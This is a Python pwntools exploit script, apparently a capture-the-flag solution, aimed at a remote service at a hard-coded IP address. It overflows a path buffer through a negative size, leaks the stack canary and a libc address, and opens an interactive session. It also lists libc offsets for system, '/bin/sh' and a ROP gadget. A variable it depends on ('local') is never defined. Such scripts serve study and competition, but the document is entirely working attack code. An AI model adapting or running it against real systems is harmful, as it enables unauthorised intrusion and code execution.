#!/usr/bin/env python
# coding: utf-8

from pwn import *
import sys

if len(sys.argv) < 2:
	offset = 0x1710
else:
	offset = int(sys.argv[1].replace('0x', ''), 16)

print('[!] use offset = %#x' % offset)

# aggressive alias

r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
se = lambda x: p.send(x)
sel = lambda x: p.sendline(x)
pick32 = lambda x: u32(x[:4].ljust(4, '\0'))
pick64 = lambda x: u64(x[:8].ljust(8, '\0'))

# module structure & function

libc_local64 = {
	'base': 0x0,
	'__libc_start_main': 0x20740,
	'system': 0x45390,
	'unsorted_bin': 0x3c3b78,
	'free_hook': 0x3c57a8,
	'realloc_hook': 0x3c3b08,
    'main_ret': 0x20830,
    'binsh': 0x18c177
}

libc_remote = {
	'base': 0x0,
	'system': 0x45390,
    'binsh': 0x18cd57,
    'rdi_ret': 0x21102,
    'main_ret': 0x20830
}

if local:
    libc = libc_remote
else:
    libc = libc_remote

elf = {
	'base': 0x0  
}

heap = {
	'base': 0x0
}

def set_base(mod, ref, addr):
	base = addr - mod[ref]
	for element in mod:
		mod[element] += base

def Write(filename):
	ru('> ')
	sel('1')
	ru('name: ')
	sel(filename)

def Read(filename):
	ru('> ')
	sel('2')
	ru('name: ')
	sel(filename)

def GoW(sz, payload, key='1337'):
	ru('> ')
	sel('3')
	ru('data> ')
	sel(str(sz))
	ru('Data> ')
	sel(payload)
	ru('Key> ')
	sel(key)

def GoR(key='1337'):
	ru('> ')
	sel('3')
	ru('key> ')
	sel(key)

#context.log_level = 'debug'
while True:
	try:
		p = remote('202.120.7.193', 11111)
		Write('7331')
		GoW(-1, 'A' * 0x400 + '/' * offset + '202.112.51.5\0')
		Read('7331')
		ru('Reading: ')
		path = rud('\n')
		print('Reading path: %s' % path)
		GoR()
		ru('Your data (size: ')
		
		if '202.112.51.5' in path:
			print('[!] overwrite ip!')
			ru('lotus33\n')
			leaked_canary = pick64(r(8))
			r(8)
			leaked_libc = pick64(r(8))
			print('[+] canary = %#x' % leaked_canary)
			print('[+] leaked libc = %#x' % leaked_libc)
			ru('our services :)\n')
			p.interactive()
			sys.exit(1)
		p.close()
	except EOFError, e:
		print('[!] EOFError')
		p.close()
